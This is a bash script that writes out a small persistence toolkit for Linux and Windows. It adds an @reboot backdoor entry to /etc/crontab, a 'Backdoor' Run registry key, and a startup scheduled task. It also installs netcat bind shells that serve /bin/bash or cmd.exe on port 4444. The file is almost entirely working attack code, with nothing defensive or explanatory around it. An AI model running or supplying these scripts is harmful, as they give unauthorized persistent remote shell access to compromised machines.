#!/bin/bash

# Create persistence folder
mkdir -p persistence

# Create add_startup.sh for Linux
echo '#!/bin/bash' > persistence/add_startup.sh
echo 'TARGET=$1' >> persistence/add_startup.sh
echo 'echo "[*] Adding startup entry for persistence on $TARGET..."' >> persistence/add_startup.sh
echo 'echo "@reboot /path/to/backdoor" >> /etc/crontab' >> persistence/add_startup.sh
chmod +x persistence/add_startup.sh

# Create add_startup.ps1 for Windows
echo '$target = $args[0]' > persistence/add_startup.ps1
echo 'Write-Host "[*] Adding startup entry for persistence on $target..."' >> persistence/add_startup.ps1
echo '$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"' >> persistence/add_startup.ps1
echo '$regName = "Backdoor"' >> persistence/add_startup.ps1
echo '$regValue = "C:\path\to\backdoor.exe"' >> persistence/add_startup.ps1
echo 'Set-ItemProperty -Path $regKeyPath -Name $regName -Value $regValue' >> persistence/add_startup.ps1

# Create scheduled_task.ps1 for Windows
echo '$taskName = "Backdoor Task"' > persistence/scheduled_task.ps1
echo '$taskAction = New-ScheduledTaskAction -Execute "C:\path\to\backdoor.exe"' >> persistence/scheduled_task.ps1
echo '$taskTrigger = New-ScheduledTaskTrigger -AtStartup' >> persistence/scheduled_task.ps1
echo '$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfOnBatteries' >> persistence/scheduled_task.ps1
echo 'Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -Settings $taskSettings' >> persistence/scheduled_task.ps1

# Create backdoor_install.sh for Linux
echo '#!/bin/bash' > persistence/backdoor_install.sh
echo 'TARGET=$1' >> persistence/backdoor_install.sh
echo 'nc -lvp 4444 -e /bin/bash &' >> persistence/backdoor_install.sh
chmod +x persistence/backdoor_install.sh

# Create backdoor_install.ps1 for Windows
echo '$target = $args[0]' > persistence/backdoor_install.ps1
echo 'Start-Process "nc.exe" -ArgumentList "-lvnp 4444 -e cmd.exe"' >> persistence/backdoor_install.ps1
